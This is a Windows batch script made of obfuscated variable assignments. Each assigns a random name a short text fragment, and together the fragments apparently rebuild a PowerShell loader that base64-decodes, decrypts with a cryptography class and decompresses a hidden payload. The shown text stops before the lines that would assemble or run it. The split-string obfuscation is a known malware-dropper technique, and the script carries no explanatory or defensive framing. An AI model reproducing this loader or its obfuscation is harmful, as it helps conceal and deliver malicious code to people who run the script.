@echo off
set "BVnbBCSXaw=Tz ="
set "PYkOYdJUkb=yste"
set "HsBgtqbbla=vGIC"
set "aNjrKMWFRe=bstr"
set "JSQDLGxVfN=F'[-"
set "aXFGgGGZuP=zm, "
set "TNVaktTSMP=z) {"
set "JSFnrxPmqW=pose"
set "vwnXHAMFPO=New-"
set "lsdDukLzYP=);$O"
set "ZafbPLYtfc=NH);"
set "AeKPYAjyeI=ptog"
set "qzmYJRxpFT= [st"
set "cmKvRvXaqz= New"
set "qdUiUkwOiV=[-1."
set "ymCizAmBrq= = ["
set "PlGBqrVryz=zmgt"
set "elXsQwTMQd=ose("
set "tqvXbiIFFh=ach "
set "UcONaGCrGI=ionM"
set "IXsnCvXogd='[-1"
set "cAnEemLjAM=ju.I"
set "vFnttaBIcA=-joi"
set "PuqGkDpBXD=ring"
set "vethDFAXQX=:: '"
set "oHkrbBGGcB=mgtw"
set "stzpRGZYBI=w = "
set "SPnEvGPYpO=raph"
set "lBBStUQmWv=y.Ci"
set "wOAwHfsGFe=($IV"
set "ojpLdPzBij=and "
set "SCqQOIeVgE=pStr"
set "ATNQDuTzWs=ress"
set "TqVOWoXMZP=[]] "
set "myRzwQVdrH=stem"
set "DexdFYxAcz=tryP"
set "kWRMHwrTqF=);$v"
set "wocmkQuCNN=le  "
set "hwVNGYNYIF=grap"
set "ByVrmQcaor=-joi"
set "OsQgvupXAF=join"
set "MqJoKyKrdD=saBm"
set "RhcZpaWjed=tem."
set "ArDZDzbhJp=S46e"
set "VTJIzKBFTK=;$Jp"
set "zvvgdqPVRh=gnir"
set "vJxegckgWp=form"
set "qknULzKYlp=Mode"
set "eVrqquinKY=pres"
set "vyYxGEIFHD=.Cop"
set "dWHrONdoUu=ct S"
set "duUaLNMGwd=;$df"
set "dMPSUDokza=New-"
set "LuqvCTIYIk=e]::"
set "ZkhPeliJXi=7;$h"
set "MuhyhxmOkI=ptor"
set "mhqVufMVIG= '')"
set "TcygSNBKgN=[IO."
set "BkqHYVCdJy=trea"
set "JDRsYqEyVu=tion"
set "KSbAZIwAtA=oin "
set "ZvFoUZRIqW=VMgF"
set "lDOSzHJVfr=comm"
set "bMPJGZKeMn='gni"
set "NSAxvsrHtE=('%*'"
set "XWoCDdZbLH=ispo"
set "DCXVQJzbCK=1..-"
set "RwAdWJZxGL=ewLi"
set "qntkReLnsr=Comp"
set "BYETzmibAg=R5jf"
set "hIpfgCvSWE=urit"
set "OrmtMnJjGR=::('"
set "uhBrxbnGgT=hLtj"
set "TIRTvhHTrN=NH.T"
set "DaSpQSRXyA=.Mod"
set "FqCXTljTqh=Star"
set "GlHLUAOGiP=dA.T"
set "xIBdssrtOg=Syst"
set "xxgFeqxOSq=Ltju"
set "VHJhVcELri=g = "
set "vFaxSRFkCO=.Sec"
set "GvkBAAwdBz= = N"
set "ZwpdGOCmmq=se()"
set "iLqhHXEYGj=Wyqo"
set "BIPLmbxfYY=Conv"
set "zWfpQJRFhn=join"
set "ZNiHyCgHoi=Ltju"
set "kQEBKYSnsZ=Z.En"
set "HblclWwkBx=-Obj"
set "eedBtXPugt=yTo("
set "tPAleCsYHi=IoO3"
set "CySIStMNxB== $h"
set "ZldJqnXRSK=am;$"
set "CVqKuUxXbj=rans"
set "jLBUNIeftW=brea"
set "sgecLxEQSz=gMod"
set "PyNfEqtTEZ=HBXz"
set "PFqBtluBfX=fore"
set "MaxDkmfYJK=IWC "
set "dSyLelGzqw=16] "
set "erefAsapJl=em.C"
set "VsGcpZpICx=ress"
set "MuWiYcNyYc=[Env"
set "gFuDISGAer=th('"
set "gryMaVkEFN=.Len"
set "lbZwWTOWXV=stem"
set "qSdOQKicJQ=FTNH"
set "FIPZMATHiM=ptdk"
set "ilMYaGwHSm=Jpam"
set "FQGWBqdRwY=2VUN"
set "wowdIeExpE=IVIW"
set "NpoeCtXDRD=vert"
set "FsMWdcwyIx=;$df"
set "royhyyUqIA=morF"
set "yzuuwlYsoK=PKCS"
set "ZFGdiZxtWh=[Sys"
set "EiJBRwmhhw=ment"
set "XguDGTsWLP=dV1k"
set "MfknbnRqxG==');"
set "DrupOxzlvl=.Con"
set "ElBCyRksgT=..-1"
set "zPsbRVkfSo=Disp"
set "zydxJNkaiX=onve"
set "yCWdCovolQ=NdA."
set "OiNEwHhIgR=nage"
set "wzoDKCrAGB=oL'["
set "fqhnZJkyfb=em.I"
set "dcwNPIKcRC=y.Cr"
set "KVMCVSVUyQ=[Sys"
set "ISfZuNfqNd=);$A"
set "PbcIwePsQQ=ode]"
set "UiAaVNFCIX=ose("
